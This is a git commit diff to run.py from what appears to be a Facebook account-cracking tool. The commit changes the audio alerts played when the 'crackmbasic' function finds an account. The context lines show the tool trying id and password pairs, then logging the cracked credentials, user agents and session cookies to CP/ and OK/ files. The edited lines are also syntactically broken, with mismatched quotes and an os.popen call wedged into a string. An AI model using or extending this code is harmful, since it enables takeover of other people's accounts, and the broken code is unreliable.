8141b53228c807724881a62c7fa6476cc95075ba
XyzonXD <131737930+Ramzgod@users.noreply.github.com>
2023-05-01 01:30:06 +0700

    Update run.py

--- run.py
+++ run.py
@@ -1809,7 +1809,7 @@ def crackmbasic(idf,pwv):
 			if "checkpoint" in po.cookies.get_dict().keys():
 				cetak(panel(f"[bold yellow]{idf} ◊ {pw}",width=35,title=f"[bold red][[bold white] Data [bold red]]",style=f"bold red"))
 				cetak(panel(f"[bold yellow]{ua}",width=90,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"bold red"))
-				open("CP/'+cpc,'a').write(idf+'|'+pw+;os.popen("play-audio data/cp.mp3")\n')
+				open("CP/'+cpc,'a').write(idf+'|'+pw+;os.popen("play-audio data/audio/cp.mp3")\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
 				break
@@ -1820,7 +1820,7 @@ def crackmbasic(idf,pwv):
 				cetak(panel(f"[bold green]{idf} ◊ {pw}",width=35,title=f"[bold red][[bold white] Data [bold red]]",style=f"bold red"))
 				cetak(panel(f"[bold green]{kuki}",width=90,title=f"[bold red][[bold white] Cookies [bold red]]",style=f"bold red"))
 				cetak(panel(f"[bold green]{ua}",width=90,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"bold red"))
-				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+;os.popen("play-audio data/audio/dapet.mp3")\n')
 				cek_apk(kuki)
 				break
 				
